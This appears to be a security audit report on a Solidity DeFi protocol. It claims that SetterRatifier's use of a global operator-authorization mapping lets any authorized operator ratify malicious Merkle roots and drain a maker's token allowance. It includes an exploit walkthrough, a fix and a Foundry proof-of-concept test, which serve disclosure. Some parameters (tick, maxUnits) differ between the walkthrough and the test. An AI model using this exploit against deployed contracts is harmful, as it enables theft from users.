Looking at the exact code path in `SetterRatifier.sol` and the Midnight authorization system.

### Title
Flat `isAuthorized` Allows Any Authorized Operator to Ratify Arbitrary Merkle Roots via `SetterRatifier` - (File: src/ratifiers/SetterRatifier.sol)

### Summary
`SetterRatifier.setIsRootRatified` gates access using Midnight's global, action-unscoped `isAuthorized` mapping. Any operator the maker has authorized for any purpose — collateral management, repayment, withdrawal — can call `setIsRootRatified(maker, maliciousRoot, true)` and enable arbitrary offer fills against the maker without the maker's knowledge or intent.

### Finding Description
**Exact code path:**

`SetterRatifier.setIsRootRatified` (line 25):
```solidity
require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
isRootRatified[maker][root] = newIsRootRatified;
``` [1](#0-0) 

The check delegates entirely to Midnight's flat authorization mapping:
```solidity
mapping(address authorizer => mapping(address authorized => bool)) public isAuthorized;
``` [2](#0-1) 

There is no action scope, market scope, or ratifier-specific scope. `isAuthorized[maker][operator] == true` is sufficient to pass the gate regardless of why the maker granted that authorization.

**Exploit flow:**

1. Maker calls `midnight.setIsAuthorized(setterRatifier, true, maker)` — required prerequisite so `take` does not revert at the `RatifierUnauthorized` check on line 355. [3](#0-2) 

2. Maker calls `midnight.setIsAuthorized(operator, true, maker)` — for an unrelated purpose such as collateral management or repayment. [4](#0-3) 

3. Operator constructs a Merkle tree containing a malicious offer: `offer.maker = maker`, `offer.maxUnits = type(uint256).max`, `offer.tick = 0` (best price for taker), `offer.ratifier = address(setterRatifier)`.

4. Operator calls `setterRatifier.setIsRootRatified(maker, maliciousRoot, true)`. The check `IMidnight(MIDNIGHT).isAuthorized(maker, operator)` returns `true` — the call succeeds and `isRootRatified[maker][maliciousRoot] = true`. [5](#0-4) 

5. Attacker (or operator themselves) calls `midnight.take(maliciousOffer, ratifierData, units, attacker, ...)`. `isRatified` verifies the Merkle proof against `maliciousRoot` and checks `isRootRatified[maker][maliciousRoot]` — both pass. [6](#0-5) 

6. `take` executes: if `offer.buy == true`, maker is the buyer (lender), and the attacker borrows against the maker's approved loan tokens at tick 0 (worst possible price for maker). The maker's token allowance to Midnight is drained up to `maxUnits`.

**Why existing checks fail:**

The only guard in `setIsRootRatified` is the flat `isAuthorized` check. There is no:
- Restriction to the `SetterRatifier` contract specifically (the authorization was granted for Midnight operations)
- Action or market scope
- Separate ratifier-specific authorization mapping

The protocol's own test `testIsRatifiedAuthorizedSetterCanRatifyOnBehalf` and `testTakeAuthorizedSetterCanRatifyOnBehalf` confirm this path executes without revert — the behavior is reachable by design, but the security boundary is missing. [7](#0-6) 

### Impact Explanation
A maker who authorizes any operator for any Midnight action (collateral management, repayment, withdrawal) unintentionally grants that operator the power to ratify arbitrary Merkle roots in `SetterRatifier`. The operator can construct an offer with `maxUnits = type(uint256).max` and `tick = 0`, ratify it, and enable any taker to fill it — draining the maker's token allowance to Midnight at the worst possible price. This is a direct, concrete financial loss to the maker with no recovery path once the root is ratified and the fill executed.

### Likelihood Explanation
**Preconditions:**
- Maker uses `SetterRatifier` as their ratifier (must have called `midnight.setIsAuthorized(setterRatifier, true, maker)`)
- Maker has authorized any operator for any other purpose

Both conditions are normal, expected usage patterns. Any DeFi integration that manages positions on behalf of a maker (vault, aggregator, keeper) satisfies the second condition. The attack requires no special privileges, no oracle manipulation, and no token owner action. It is repeatable for every maker who has authorized an operator.

### Recommendation
`SetterRatifier.setIsRootRatified` must not reuse Midnight's global `isAuthorized` mapping. Instead, maintain a separate, `SetterRatifier`-specific authorization mapping:

```solidity
mapping(address maker => mapping(address operator => bool)) public isSetterAuthorized;

function setIsSetterAuthorized(address operator, bool val) external {
    isSetterAuthorized[msg.sender][operator] = val;
}

function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
    require(maker == msg.sender || isSetterAuthorized[maker][msg.sender], Unauthorized());
    isRootRatified[maker][root] = newIsRootRatified;
    emit SetIsRootRatified(msg.sender, maker, root, newIsRootRatified);
}
```

This ensures that authorization to ratify roots is explicitly and separately granted, independent of any Midnight-level operator authorization.

### Proof of Concept
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {SetterRatifier} from "../src/ratifiers/SetterRatifier.sol";
import {HashLib} from "../src/ratifiers/libraries/HashLib.sol";
import {CollateralParams, Market, Offer} from "../src/interfaces/IMidnight.sol";
import {MAX_TICK} from "../src/libraries/TickLib.sol";

contract SetterRatifierAuthBypassTest is BaseTest {
    SetterRatifier internal setterRatifier;

    function setUp() public override {
        super.setUp();
        setterRatifier = new SetterRatifier(address(midnight));
    }

    function testOperatorCanRatifyArbitraryRootOnBehalfOfMaker() public {
        address maker = lender;
        address operator = makeAddr("operator"); // authorized for collateral mgmt only
        address attacker = makeAddr("attacker");

        // Step 1: maker authorizes SetterRatifier (normal usage)
        vm.prank(maker);
        midnight.setIsAuthorized(address(setterRatifier), true, maker);

        // Step 2: maker authorizes operator for collateral management (unrelated purpose)
        vm.prank(maker);
        midnight.setIsAuthorized(operator, true, maker);

        // Step 3: operator constructs malicious offer
        Market memory market;
        market.loanToken = address(loanToken);
        market.maturity = vm.getBlockTimestamp() + 100;
        market.collateralParams = new CollateralParams[](1);
        market.collateralParams[0] = CollateralParams({
            token: address(collateralToken1),
            lltv: 0.77e18,
            maxLif: maxLif(0.77e18, 0.25e18),
            oracle: address(oracle1)
        });

        Offer memory maliciousOffer;
        maliciousOffer.buy = true;
        maliciousOffer.maker = maker;
        maliciousOffer.ratifier = address(setterRatifier);
        maliciousOffer.maxUnits = type(uint128).max; // drain everything
        maliciousOffer.market = market;
        maliciousOffer.expiry = vm.getBlockTimestamp() + 200;
        maliciousOffer.tick = MAX_TICK;

        bytes32 maliciousRoot = HashLib.hashOffer(maliciousOffer);

        // Step 4: operator ratifies the malicious root — SHOULD REVERT but does not
        vm.prank(operator);
        setterRatifier.setIsRootRatified(maker, maliciousRoot, true);

        // Assert: root is now ratified without maker's intent
        assertTrue(setterRatifier.isRootRatified(maker, maliciousRoot));

        // Step 5: attacker takes the malicious offer
        uint256 units = 1000;
        deal(address(loanToken), maker, units);
        vm.prank(maker);
        loanToken.approve(address(midnight), units);
        collateralize(market, attacker, units);

        uint256 makerBalBefore = loanToken.balanceOf(maker);

        vm.prank(attacker);
        midnight.take(
            maliciousOffer,
            abi.encode(maliciousRoot, 0, new bytes32[](0)),
            units,
            attacker,
            attacker,
            address(0),
            hex""
        );

        // Assert: maker's tokens were drained without maker's consent
        assertLt(loanToken.balanceOf(maker), makerBalBefore);
        assertGt(midnight.debtOf(toId(market), attacker), 0);
    }
}
```

**Expected assertions that must hold but fail under the bug:**
- `setterRatifier.setIsRootRatified(maker, maliciousRoot, true)` called by `operator` must revert with `Unauthorized()` — it does not
- `setterRatifier.isRootRatified(maker, maliciousRoot)` must be `false` after the operator call — it is `true`
- `loanToken.balanceOf(maker)` must be unchanged — it decreases

### Citations

**File:** src/ratifiers/SetterRatifier.sol (L24-28)
```text
    function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
        require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
        isRootRatified[maker][root] = newIsRootRatified;
        emit SetIsRootRatified(msg.sender, maker, root, newIsRootRatified);
    }
```

**File:** src/ratifiers/SetterRatifier.sol (L30-36)
```text
    function isRatified(Offer memory offer, bytes memory ratifierData) external view returns (bytes32) {
        require(msg.sender == MIDNIGHT, NotMidnight());
        (bytes32 root, uint256 leafIndex, bytes32[] memory proof) =
            abi.decode(ratifierData, (bytes32, uint256, bytes32[]));
        require(HashLib.isLeaf(root, HashLib.hashOffer(offer), leafIndex, proof), InvalidProof());
        require(isRootRatified[offer.maker][root], NotRatified());
        return CALLBACK_SUCCESS;
```

**File:** src/Midnight.sol (L192-192)
```text
    mapping(address authorizer => mapping(address authorized => bool)) public isAuthorized;
```

**File:** src/Midnight.sol (L355-356)
```text
        require(isAuthorized[offer.maker][offer.ratifier], RatifierUnauthorized());
        require(IRatifier(offer.ratifier).isRatified(offer, ratifierData) == CALLBACK_SUCCESS, RatifierFail());
```

**File:** src/Midnight.sol (L731-734)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
```

**File:** test/SetterRatifierTest.sol (L48-77)
```text
    function testIsRatifiedAuthorizedSetterCanRatifyOnBehalf() public {
        Offer memory offer = makeOffer(lender);
        bytes32 _root = HashLib.hashOffer(offer);

        vm.prank(lender);
        midnight.setIsAuthorized(borrower, true, lender);

        vm.prank(borrower);
        setterRatifier.setIsRootRatified(lender, _root, true);

        vm.prank(address(midnight));
        bytes32 result = setterRatifier.isRatified(offer, abi.encode(_root, 0, new bytes32[](0)));
        assertEq(result, CALLBACK_SUCCESS);
    }

    function testTakeAuthorizedSetterCanRatifyOnBehalf() public {
        Offer memory offer = makeOffer(lender);
        bytes32 _root = HashLib.hashOffer(offer);

        vm.prank(lender);
        midnight.setIsAuthorized(address(setterRatifier), true, lender);
        vm.prank(lender);
        midnight.setIsAuthorized(borrower, true, lender);

        vm.prank(borrower);
        setterRatifier.setIsRootRatified(lender, _root, true);

        vm.prank(borrower);
        midnight.take(offer, abi.encode(_root, 0, new bytes32[](0)), 0, borrower, borrower, address(0), hex"");
    }
```
